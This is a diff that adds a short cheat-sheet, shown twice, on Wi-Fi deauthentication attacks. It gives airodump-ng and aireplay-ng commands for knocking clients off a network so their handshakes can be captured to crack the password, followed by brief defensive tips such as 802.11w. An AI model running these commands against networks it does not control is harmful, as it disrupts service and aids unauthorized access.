@@ -1,0 +1,58 @@
+Deauthentication
+
+The idea is to send a non-valid deauthentication request on a Wi-Fi Network   
+                                                                               
+After the machine tries to reconnect, that allows to capture connection       
+handshakes used to discover Wi-Fi password.                                   
+                                                                               
+
+
+-> How to perform a deauthentication
+
+1. Check network, SSID, target and access points.
+$ sudo airodump-ng wlan0 
+
+2. Send deauthentication message.
+$ sudo aireplay-ng -0 <nb> -a <MAC access point> -c <MAC target> <interface> 
+>>> -0:       or --deauth (option set by default). 
+>>> <nb>:	nb of deauthentication, 0 means infinite.
+>>> -c:	/!\ no -c means all machines connected to <MAC access point>.
+
+-> How to prevent
+-Not easy to prevent and detect DOS attack.
+-Use hash to verify the deautjetication request.
+-Find the author of this attack (IP, user) and ask him to stop that.
+-Use wired connections.
+-Use 802.11w norm (Managing Frame Protection).
+
+>@#################################################################################
+>@#                                                                               #
+>@# [ Deauthentication ]                                                          #
+>@# The idea is to send a non-valid deauthentication request on a Wi-Fi Network   #
+>@#                                                                               #
+>@# After the machine tries to reconnect, that allows to capture connection       #
+>@# handshakes used to discover Wi-Fi password.                                   #
+>@#                                                                               #
+>@#-------------------------------------------------------------------------------#
+>@
+>@-> How to perform a deauthentication
+>@
+>@1. Check network, SSID, target and access points.
+>@$ sudo airodump-ng wlan0 
+>@
+>@2. Send deauthentication message.
+>@$ sudo aireplay-ng -0 <nb> -a <MAC access point> -c <MAC target> <interface> 
+>@
+>@>>> -0:       or --deauth (option set by default). 
+>@>>> <nb>:     nb of deauthentication, 0 means infinite.
+>@>>> -c:       /!\ no -c means all machines connected to <MAC access point>.
+>@
+>@-> How to prevent
+>@-Not easy to prevent and detect DOS attack.
+>@-Use hash to verify the deautjetication request.
+>@-Find the author of this attack (IP, user) and ask him to stop that.
+>@-Use wired connections.
+>@-Use 802.11w norm (it uses Managing frames Protection).
+>@
+>@#################################################################################
+>@
